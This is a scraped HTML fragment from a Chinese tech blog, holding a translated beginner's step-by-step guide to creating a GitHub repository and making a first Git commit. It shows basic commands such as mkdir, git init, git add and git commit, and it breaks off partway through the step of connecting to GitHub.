</span><span class=\"crayon-i\">myBranch</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a6ae357615029-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>其中 <code>-d</code> (也可以用 <code>--delete</code>) 也用于告知 GitHub 删除你的分支。</p>\n<p>我们学习了 Git 分支的使用，在本系列的下一篇文章中，我们将介绍如何执行 <code>fetch</code> 和 <code>rebase</code> 操作，对于多人同时的贡献的项目而言，这是很必须学会的。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114107\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114107votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114107\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/0870bcb4320291e61232dfc38ab50b871c6b8c41.jpg"},{"url_object_id": "b0fe29cc0c4c89c756cfc2daf1bfe5cb", "title": ["手把手指导您使用 Git"], "url": "http://blog.jobbole.com/114101/", "create_date": "2018/06/08", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/02/2027c50856ddfe647e45b4ac2e86c9f1.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 5, "tags": "IT技术, Git, Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/1/step-step-guide-git\">Kedar Vijay Kulkarni</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9319-1.html\">Linux中国/ChenYi</a>   </div><p>如果您从未使用过 <a href=\"https://opensource.com/resources/what-is-git\">Git</a>，甚至可能从未听说过它。莫慌张，只需要一步步地跟着这篇入门教程，很快您就会在 <a href=\"https://opensource.com/life/15/11/short-introduction-github\">GitHub</a> 上拥有一个全新的 Git 仓库。</p>\n<p>在开始之前，让我们先理清一个常见的误解：Git 并不是 GitHub。Git 是一套版本控制系统（或者说是一款软件），能够协助您跟踪计算机程序和文件在任何时间的更改。它同样允许您在程序、代码和文件操作上与同事协作。GitHub 以及类似服务（包括 GitLab 和 BitBucket）都属于部署了 Git 程序的网站，能够托管您的代码。</p>\n<h3 id=\"toc_1\">步骤 1：申请一个 GitHub 账户</h3>\n<p>在 <a href=\"https://github.com/\">GitHub.com</a> 网站上（免费）创建一个账户是最简单的方式。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/2ea0e8b205ec27442832ce5b1e0c4b8e.png\" alt=\"\"></p>\n<p>选择一个用户名（比如说，octocat123），输入您的邮箱地址和密码，然后点击 <strong>Sign up for GitHub</strong>。进入之后，您将看到下方插图的界面：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/40cb004cd0b2c76974a758187dd42609.png\" alt=\"\"></p>\n<h3 id=\"toc_2\">步骤 2：创建一个新的仓库</h3>\n<p>一个仓库（ repository），类似于能储存物品的场所或是容器；在这里，我们创建仓库存储代码。在 <code>+</code> 符号（在插图的右上角，我已经选中它了） 的下拉菜单中选择 <strong>New Repository</strong>。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/03428a7fdaed912f2fe0b4cd3d7e6b21.png\" alt=\"\"></p>\n<p>给您的仓库命名（比如说，Demo）然后点击 <strong>Create Repository</strong>。无需考虑本页面的其他选项。</p>\n<p>恭喜！您已经在 GitHub.com 中建立了您的第一个仓库。</p>\n<h3 id=\"toc_3\">步骤 3: 创建文件</h3>\n<p>当仓库创建完毕后，界面将和下方一致：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/495f98aaf52d221a19f36c00fab9f348.png\" alt=\"\"></p>\n<p>不必惊慌，它比看上去简单。跟紧步骤。忽略其他内容，注意截图上的 “…or create a new repository on the command line,”。</p>\n<p>在您的计算机中打开终端。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/2d4acbf3a6a04a52708163d0e0076ab6.png\" alt=\"\"></p>\n<p>键入 <code>git</code> 然后回车。如果命令行显示 <code>bash: git: command not found</code>，在您的操作系统或发行版 <a href=\"https://www.linuxbabe.com/linux-server/install-git-verion-control-on-linux-debianubuntufedoraarchlinux#crt-2\">安装 Git</a> 命令。键入 <code>git</code> 并回车检查是否成功安装；如果安装成功，您将看见大量关于使用该命令的说明信息。</p>\n<p>在终端内输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe013434026436151\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmkdir Demo\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe013434026436151-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe013434026436151-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe013434026436151-1\"><span class=\"crayon-e\">mkdir </span><span class=\"crayon-i\">Demo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe013434026436151-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这个命令将会创建一个名为 Demo 的目录（文件夹）。</p>\n<p>如下命令将会切换终端目录，跳转到 Demo 目录：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe01343d416338477\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd Demo\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe01343d416338477-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe01343d416338477-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe01343d416338477-1\"><span class=\"crayon-e\">cd </span><span class=\"crayon-i\">Demo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe01343d416338477-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>然后输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe013441351757830\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\necho \"#Demo\" &gt;&gt; README.md\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe013441351757830-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe013441351757830-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe013441351757830-1\"><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"#Demo\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">README</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">md</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe013441351757830-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>创建一个名为 <code>README.md</code> 的文件，并写入 <code>#Demo</code>。检查文件是否创建成功，请输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe013445311010600\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncat README.md\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe013445311010600-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe013445311010600-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe013445311010600-1\"><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">README</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">md</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe013445311010600-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>这将会为您显示 <code>README.md</code> 文件的内容，如果文件创建成功，您的终端会有如下显示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/dc452e9264aa58b7502df5c06069e24c.png\" alt=\"\"></p>\n<p>使用 Git 程序告诉您的电脑，Demo 是一个被 Git 管理的目录，请输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe013448874644553\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit init\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe013448874644553-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe013448874644553-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe013448874644553-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">init</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe013448874644553-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>然后，告诉 Git 程序您关心的文件并且想在此刻起跟踪它的任何改变，请输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe01344b899324607\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit add README.md\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe01344b899324607-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe01344b899324607-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe01344b899324607-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">add </span><span class=\"crayon-v\">README</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">md</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe01344b899324607-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h3 id=\"toc_4\">步骤 4：创建一次提交</h3>\n<p>目前为止，您已经创建了一个文件，并且已经通知了 Git，现在，是时候创建一次提交commit了。提交可以看作是一个里程碑。每当完成一些工作之时，您都可以创建一次提交，保存文件当前版本，这样一来，您可以返回之前的版本，并且查看那时候的文件内容。无论何时您修改了文件，都可以对文件创建一个上一次的不一样的新版本。</p>\n<p>创建一次提交，请输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe01344f757259449\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit commit -m \"first commit\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe01344f757259449-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe01344f757259449-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe01344f757259449-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"first commit\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe01344f757259449-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>就是这样！刚才您创建了包含一条注释为 “first commit” 的 Git 提交。每次提交，您都必须编辑注释信息；它不仅能协助您识别提交，而且能让您理解此时您对文件做了什么修改。这样到了明天，如果您在文件中添加新的代码，您可以写一句提交信息：“添加了新的代码”，然后当您一个月后回来查看提交记录或者 Git 日志（即提交列表），您还能知道当时的您在文件夹里做了什么。</p>\n<h3 id=\"toc_5\">步骤 5: 将您的计算机与 GitHub 仓库相连接</h3>\n<p>现在，是时候用如下命令将您的计算机连接到 GitHub 仓库了：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe013452777891292\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div 